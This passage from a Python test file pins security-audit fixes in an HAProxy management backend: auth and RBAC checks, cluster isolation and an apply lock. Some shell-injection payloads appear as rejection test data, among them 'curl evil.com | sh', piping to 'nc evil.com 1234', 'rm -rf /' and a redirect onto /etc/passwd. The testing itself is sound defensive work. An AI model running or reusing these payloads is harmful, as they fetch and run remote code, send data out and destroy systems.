            assert "if x_api_key and not agent_auth:" not in code_only
            assert "if not agent_auth:" in code_only
            break
    else:
        raise AssertionError("submit_config_response not found")


def test_bulgu75_agent_webhooks_have_bulgu_marker():
    """Source-level pin so a future refactor doesn't drop the
    fix silently. The four webhooks in agent.py + the one in
    configuration.py all carry the marker."""
    src_agent = _backend_src("routers/agent.py")
    src_cfg = _backend_src("routers/configuration.py")
    # agent.py has FOUR webhooks (config-applied,
    # config-validation-failed, config-sync, upgrade-complete).
    assert src_agent.count("Bulgu #75 (round-22 audit)") >= 4
    # configuration.py has ONE (config-response).
    assert "Bulgu #75 (round-22 audit)" in src_cfg


# ---- Bulgu #76 — add_server_to_backend had NO authentication ----


def test_bulgu76_add_server_signature_requires_authorization():
    """The fix adds an `authorization: str = Header(None)` kwarg
    and gates on `backends.update`. Pin both."""
    src = _backend_src("routers/backend.py")
    fn_start = src.find("async def add_server_to_backend(")
    assert fn_start != -1
    # Take a generous window after the def so the multi-line
    # signature + the first part of the body are both inside.
    window = src[fn_start:fn_start + 2500]
    assert "authorization: str = Header(None)" in window
    assert "check_user_permission" in window
    assert '"backends"' in window and '"update"' in window
    assert "Bulgu #76 (round-22 audit)" in window


# ---- Bulgu #77 — server CRUD endpoints missing permission gate ----


def test_bulgu77_server_crud_endpoints_check_permission():
    """`delete_server`, `update_server`, `toggle_server` all
    pre-fix only called `get_current_user_from_token` and never
    `check_user_permission` — any logged-in viewer could mutate
    server state. Pin the new RBAC gate."""
    src = _backend_src("routers/backend.py")
    for fn_name in ("delete_server", "update_server", "toggle_server"):
        # Find the function body window.
        fn_start = src.find(f"async def {fn_name}(")
        assert fn_start != -1, f"{fn_name} missing"
        body = src[fn_start:fn_start + 1500]
        assert "check_user_permission" in body, (
            f"{fn_name} missing RBAC check"
        )
        assert '"backends"' in body and '"update"' in body, (
            f"{fn_name} not gated on backends.update"
        )
    assert "Bulgu #77 (round-22 audit)" in src


# ---- Bulgu #78 — cleanup-expired & diff endpoint auth ----


def test_bulgu78_cleanup_expired_requires_admin():
    src = _backend_src("routers/configuration.py")
    # Cleanup signature must accept the authorization header.
    assert "async def cleanup_expired_requests(authorization: str = Header(None))" in src
    # Body must gate on is_admin (not just authn).
    assert 'is_admin' in src
    assert "Bulgu #78 (round-22 audit)" in src


def test_bulgu78_compare_configurations_requires_auth():
    src = _backend_src("routers/config.py")
    fn_start = src.find("async def compare_configurations(")
    assert fn_start != -1
    window = src[fn_start:fn_start + 2500]
    assert "authorization: str = Header(None)" in window
    assert "get_current_user_from_token" in window
    assert "Bulgu #78 (round-22 audit)" in window


# ---- Bulgu #79 — multi-cluster isolation on apply / restore / WAF ----


def test_bulgu79_cluster_py_has_helper():
    """cluster.py pre-fix had NO calls to
    validate_user_cluster_access — every cluster-scoped mutation
    only checked permission ROLE, not pool/cluster scope. Pin
    that the helper is now defined locally and used at least at
    apply / delete / update / restore-confirm / undo-reject /
    reject-all-pending sites."""
    src = _backend_src("routers/cluster.py")
    assert "async def validate_user_cluster_access(" in src
    # The helper is now invoked at each of the six mutation
    # sites; pin with a generous lower-bound count so a future
    # refactor that hoists the helper into auth_middleware
    # doesn't have to update this number.
    assert src.count("validate_user_cluster_access(current_user") >= 6
    assert "Bulgu #79 (round-22 audit)" in src


def test_bulgu79_backend_server_handlers_check_cluster():
    """The three server CRUD handlers (delete / update / toggle)
    now ALSO validate cluster access, not just the
    `backends.update` permission. Pin per-handler."""
    src = _backend_src("routers/backend.py")
    for fn_name in ("delete_server", "update_server", "toggle_server"):
        fn_start = src.find(f"async def {fn_name}(")
        assert fn_start != -1
        # Window covers ~1500 chars after the def: enough for
        # the prelude where the cluster check now lives.
        window = src[fn_start:fn_start + 2500]
        assert "validate_user_cluster_access(current_user" in window, (
            f"{fn_name} missing cluster access validation"
        )


def test_bulgu77_global_server_delete_alias_gates_on_backends_update():
    """BackendServers.js calls `DELETE /api/servers/{id}` which
    routes to `routers/user.py::delete_server_global` — a
    compatibility alias kept alongside the canonical
    `routers/backend.py::delete_server`. The original Bulgu #77
    fix only added the `backends.update` permission check to the
    canonical handler, so the FE delete path was still missing
    the per-action RBAC check. Pin that the alias now gates on
    `backends.update` too."""
    src = _backend_src("routers/user.py")
    fn_start = src.find("async def delete_server_global(")
    assert fn_start != -1, (
        "Compatibility alias DELETE /api/servers/{id} removed?"
    )
    window = src[fn_start:fn_start + 2500]
    assert 'check_user_permission(' in window, (
        "delete_server_global must call check_user_permission"
    )
    assert '"backends", "update"' in window or "'backends', 'update'" in window, (
        "delete_server_global must gate on backends.update"
    )


def test_bulgu79_waf_handlers_check_cluster():
    """WAF rules carry an optional cluster_id; update_waf_rule
    and toggle_waf_rule_status both validate access when
    cluster_id is non-NULL."""
    src = _backend_src("routers/waf.py")
    for fn_name in ("update_waf_rule", "toggle_waf_rule_status"):
        fn_start = src.find(f"async def {fn_name}(")
        assert fn_start != -1
        window = src[fn_start:fn_start + 4000]
        assert "validate_user_cluster_access(current_user" in window, (
            f"{fn_name} missing cluster access validation"
        )
    assert "Bulgu #79" in src


# ---- Bulgu #80 — apply_pending_changes concurrency lock ----


def test_bulgu80_apply_uses_advisory_lock():
    """Apply pre-fix had no concurrency control, so two
    operators clicking Apply at the same instant double-shipped
    consolidated config_versions. Pin the per-cluster advisory
    lock + the post-lock re-fetch + the drained-early-return
    sentinel.

    Post-Bulgu-#80 risk-audit refinement: the original two-TX
    split was collapsed into one locked TX with a module-level
    ``_ConcurrentlyDrained`` sentinel exception, eliminating the
    gap-between-transactions race. Pin both the namespace
    constant AND the sentinel mechanism so a future refactor
    that reverts to the unprotected pipeline trips the test.
    """
    src = _backend_src("routers/cluster.py")
    # The new namespace constant — disjoint from the wizard's
    # `18181818` and `18181819`.
    assert "APPLY_LOCK_NS = 18181820" in src
    # The lock is taken via pg_advisory_xact_lock inside a
    # transaction (xact_lock semantics).
    assert "SELECT pg_advisory_xact_lock($1, $2)" in src
    # Sentinel-based drained-early-return — module-level class
    # so the outer except clause can resolve it even when the
    # function fails before reaching the body.
    assert "class _ConcurrentlyDrained(Exception):" in src
    assert "raise _ConcurrentlyDrained()" in src
    assert "except _ConcurrentlyDrained:" in src
    assert "Bulgu #80 (round-22 audit)" in src
    # Pin the under-lock re-fetch — the entire point of the
    # collapse was to read PENDING list AFTER acquiring the
    # lock, not before.
    assert "pending_versions_locked = await conn.fetch" in src


def test_bulgu80_lock_acquired_before_consolidated_insert():
    """The lock MUST be acquired before the consolidated
    `INSERT INTO config_versions ... status='APPLIED'`. Pin via
    source-order check: the lock namespace string appears before
    the consolidated-insert literal in the file."""
    src = _backend_src("routers/cluster.py")
    lock_idx = src.find("APPLY_LOCK_NS = 18181820")
    insert_idx = src.find("VALUES ($1, $2, $3, $4, $5, TRUE, 'APPLIED'")
    assert lock_idx != -1 and insert_idx != -1
    assert lock_idx < insert_idx, (
        "Bulgu #80 regression: advisory lock must come BEFORE "
        "the consolidated APPLIED insert"
    )


def test_bulgu80_lock_namespace_disjoint_from_wizard_locks():
    """The wizard uses 18181818 (drafts) and 18181819 (create-
    site). Apply must use a different namespace so the two lock
    spaces don't collide and serialise unrelated operations."""
    src_apply = _backend_src("routers/cluster.py")
    src_wizard = _backend_src("routers/site_wizard.py")
    assert "APPLY_LOCK_NS = 18181820" in src_apply
    # The wizard's two namespaces appear in literal form.
    assert "18181818" in src_wizard
    assert "18181819" in src_wizard
    # The apply lock namespace MUST NOT match either wizard
    # namespace.
    assert "18181820" not in src_wizard, (
        "Apply lock namespace 18181820 must not collide with the "
        "wizard's namespaces"
    )


# ---- Bulgu #81 — AgentScriptRequest field validation against shell injection ----


def test_bulgu81_haproxy_bin_path_rejects_command_substitution():
    """A `$(rm -rf /)`-style payload in any path field MUST be
    rejected at the Pydantic boundary, before it ever reaches
    the template substitution."""
    from models.agent import AgentScriptRequest
    from pydantic import ValidationError
    base = dict(
        platform="linux", architecture="amd64", pool_id=1, cluster_id=1,
        agent_name="agt-1", hostname_prefix="hp-1",
        haproxy_bin_path="/usr/sbin/haproxy",
        haproxy_config_path="/etc/haproxy/haproxy.cfg",
        stats_socket_path="/var/run/haproxy.sock",
    )
    for field, payload in [
        ("haproxy_bin_path", "/usr/sbin/haproxy; rm -rf /"),
        ("haproxy_bin_path", "/usr/sbin/haproxy && curl evil.com | sh"),
        ("haproxy_bin_path", "/usr/sbin/$(rm -rf /)"),
        ("haproxy_bin_path", "/usr/sbin/`reboot`"),
        ("haproxy_bin_path", "/usr/sbin/haproxy\nrm -rf /"),
        ("haproxy_config_path", "/etc/haproxy/haproxy.cfg|nc evil.com 1234"),
        ("stats_socket_path", "/var/run/haproxy.sock>/etc/passwd"),
        ("stats_socket_path", "/var/run/haproxy.sock'rm"),
        ("haproxy_bin_path", "../../usr/sbin/haproxy"),
        ("haproxy_bin_path", "usr/sbin/haproxy"),  # not absolute
    ]:
        bad = {**base, field: payload}
        try:
            AgentScriptRequest(**bad)
        except ValidationError:
            continue
        raise AssertionError(
            f"Bulgu #81 regression: {field}={payload!r} was accepted"
        )


def test_bulgu81_agent_name_rejects_metacharacters():
    """Agent name / hostname prefix flow into the install
    script as bash variables; metacharacters break out of the
    quoted context."""
    from models.agent import AgentScriptRequest
    from pydantic import ValidationError
    base = dict(
        platform="linux", architecture="amd64", pool_id=1, cluster_id=1,
        agent_name="agt-1", hostname_prefix="hp-1",
        haproxy_bin_path="/usr/sbin/haproxy",
        haproxy_config_path="/etc/haproxy/haproxy.cfg",
        stats_socket_path="/var/run/haproxy.sock",
    )
    for payload in [
        "$(rm -rf /var/log/haproxy-agent)",
        "`reboot`",
        "agent; curl evil.com/x.sh|sh",
        "agent\nrm -rf /",
        "agent with spaces",
        "",  # empty
        "-leading-dash",  # invalid first char (per regex)
    ]:
        bad = {**base, "agent_name": payload}
        try:
            AgentScriptRequest(**bad)
        except ValidationError:
            continue
        raise AssertionError(
            f"Bulgu #81 regression: agent_name={payload!r} was accepted"
        )


def test_bulgu81_valid_inputs_still_accepted():
    """Sanity: the regex isn't so strict it rejects legitimate
    real-world inputs."""
    from models.agent import AgentScriptRequest
    AgentScriptRequest(
        platform="linux", architecture="amd64", pool_id=1, cluster_id=1,
        agent_name="prod-edge-01",
        hostname_prefix="haproxy.example.com",
        haproxy_bin_path="/usr/sbin/haproxy",
        haproxy_config_path="/etc/haproxy/haproxy.cfg",
        stats_socket_path="/var/run/haproxy.sock",
    )
    AgentScriptRequest(
        platform="macos", architecture="arm64", pool_id=2, cluster_id=3,
        agent_name="dev_agent.1",
        hostname_prefix="mac.local",
        haproxy_bin_path="/opt/homebrew/sbin/haproxy",
        haproxy_config_path="/opt/homebrew/etc/haproxy.cfg",
        stats_socket_path="/opt/homebrew/var/run/haproxy.sock",
    )


# ---- Bulgu #82 — bulk import / agent script cluster access ----


def test_bulgu82_bulk_create_validates_cluster_access():
    src = _backend_src("routers/config.py")
    # Pin per-handler invocation.
    for fn_name in ("parse_bulk_config", "bulk_create_entities"):
        fn_start = src.find(f"async def {fn_name}(")
        assert fn_start != -1
        window = src[fn_start:fn_start + 6000]
        assert "validate_user_cluster_access" in window, (
            f"{fn_name} missing cluster access validation"
        )
    assert "Bulgu #82 (round-22 audit)" in src


def test_bulgu82_generate_install_script_validates_cluster():
    src = _backend_src("routers/agent.py")
    fn_start = src.find("async def generate_install_script(")
    assert fn_start != -1
    window = src[fn_start:fn_start + 5000]
    assert "validate_user_cluster_access" in window
    assert "Bulgu #82 (round-22 audit)" in window
